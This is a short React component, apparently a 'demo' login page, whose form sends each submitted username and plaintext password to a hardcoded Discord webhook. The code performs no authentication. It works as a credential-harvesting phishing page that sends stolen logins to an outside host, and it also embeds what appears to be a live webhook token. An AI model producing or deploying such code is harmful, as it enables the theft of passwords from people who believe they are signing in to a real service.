import { useState } from 'react'

function DemoPage() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Replace with your actual Discord webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1371538800643407982/9-s85jPu91llCDwC3oLKVmPE3tqK-0KZQnp6F7ssSRgc6hIWlVQha7V4hyW0nWXpUzmp";

    const message = {
      content: `🚨 New Login Submission:\n**Username:** ${formData.username}\n**Password:** ${formData.password}`,
    };

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      });

      if (response.ok) {
        alert('✅ Data sent to Discord successfully!');
      } else {
        alert('❌ Failed to send data to Discord.');
      }
    } catch (error) {
      console.error('Error sending to Discord:', error);
      alert('❌ An error occurred while sending the data.');
    }
  };

  return (
    <div style={{ padding: '2rem' }}>
      <h2>Login Page</h2>
      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', width: '300px' }}>
        <label>
          Username:
          <input
            type="text"
            name="username"
            value={formData.username}
            onChange={handleChange}
            required
            style={{ marginBottom: '1rem', padding: '0.5rem' }}
          />
        </label>
        
        <label>
          Password:
          <input
            type="password"
            name="password"
            value={formData.password}
            onChange={handleChange}
            required
            style={{ marginBottom: '1rem', padding: '0.5rem' }}
          />
        </label>

        <button type="submit" style={{ padding: '0.5rem' }}>
          Submit
        </button>
      </form>
    </div>
  );
}

export default DemoPage;
